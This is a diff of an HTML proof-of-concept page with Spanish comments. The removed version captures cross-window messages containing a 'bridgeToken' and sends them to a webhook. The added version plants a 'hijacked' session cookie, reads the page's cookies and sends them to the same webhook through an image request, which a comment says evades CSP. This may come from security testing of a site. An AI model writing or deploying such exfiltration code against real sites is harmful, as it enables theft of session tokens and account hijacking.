@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h2>Interceptando bridgeToken...</h2>
-    <pre id="log" style="background:#000; color:#0f0; padding:10px; min-height:100px;"></pre>
+    <h2>Cookie Test en GitHub Pages</h2>
+    <pre id="log" style="background:#000; color:#0f0; padding:10px;"></pre>
 
     <script>
         const logEl = document.getElementById('log');
@@ -12,23 +12,24 @@
             logEl.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
         }
 
-        // Escuchar CUALQUIER mensaje del padre
-        window.addEventListener("message", (event) => {
-            const dataString = JSON.stringify(event.data);
-            log(`📩 Mensaje de ${event.origin}: ${dataString}`);
+        log("Origen actual: " + window.location.origin);
+        log("¿Es Top Frame? " + (window.self === window.top));
 
-            // Si contiene el token, exfiltramos
-            if (dataString.includes("bridgeToken")) {
-                log("🚨 ¡BRIDGE TOKEN ENCONTRADO!");
-                
-                // Exfiltramos vía Image Tag (evita CSP)
-                const img = new Image();
-                img.src = `${webhookUrl}?bridge_token=true&data=${encodeURIComponent(dataString)}`;
-                log("📤 Token enviado al webhook.");
-            }
-        });
+        // 1. Escribimos una cookie en el dominio de GitHub Pages
+        try {
+            document.cookie = "muse_session_hijacked=CUENTA_2_HACKEADA; path=/; secure; SameSite=None";
+            log("✅ Cookie inyectada en " + window.location.hostname);
+        } catch (e) {
+            log("❌ Error al inyectar: " + e.message);
+        }
 
-        log("Listener activo. Esperando token...");
+        // 2. Leemos las cookies
+        log("Cookies actuales: " + document.cookie);
+
+        // 3. Exfiltramos al webhook
+        const img = new Image();
+        img.src = `${webhookUrl}?cookie_github=true&data=${encodeURIComponent(document.cookie)}`;
+        log("📤 Exfiltración enviada al webhook.");
     </script>
 </body>
 </html>
